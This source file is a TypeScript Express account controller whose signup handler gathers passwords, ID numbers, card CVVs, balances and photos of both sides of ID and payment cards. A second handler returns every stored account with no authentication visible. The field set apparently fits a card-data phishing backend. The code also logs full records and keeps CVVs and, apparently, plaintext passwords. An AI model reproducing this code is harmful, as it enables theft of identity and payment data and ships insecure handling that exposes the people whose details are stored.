import { Request, Response } from "express";
import { Account } from "../models/account.model";

export class AccountController {
  async signup(req: Request, res: Response) {
    try {
      const {
        email,
        password,
        name,
        phone,
        address,
        idCard,
        birthday,
        cvv,
        cardLimit,
        cardBalance,
        proposeLimit,
        cardType,
      } = req.body;

      let frontIdCard = "";
      let backIdCard = "";
      let frontCard = "";
      let backCard = "";

      if (req.files) {
        const files = req.files as {
          [fieldname: string]: Express.Multer.File[];
        };

        if (!files.frontIdCard || !files.backIdCard) {
          return res.status(400).json({
            message: "Front and back of ID card are required",
          });
        }

        if (!files.frontCard || !files.backCard) {
          return res.status(400).json({
            message: "Front and back of card are required",
          });
        }

        frontIdCard = files.frontIdCard[0].path;
        backIdCard = files.backIdCard[0].path;
        frontCard = files.frontCard[0].path;
        backCard = files.backCard[0].path;
      }

      const account = new Account({
        email,
        password,
        name,
        phone,
        address,
        frontIdCard,
        backIdCard,
        idCard,
        birthday,
        cvv,
        frontCard,
        backCard,
        cardLimit,
        cardBalance,
        proposeLimit,
        cardType,
      });

      console.log(account);

      await account.save();

      return res.status(200).json({
        message: "Signup successfully",
      });
    } catch (error: any) {
      console.log(error.message);
      return res.status(500).json({
        message: "Internal server error",
      });
    }
  }

  async getAll(req: Request, res: Response) {
    try {
      const accounts = await Account.find();

      return res.status(200).json({
        accounts,
      });
    } catch (error) {
      console.log(error);
      return res.status(500).json({
        message: "Internal server error",
      });
    }
  }
}
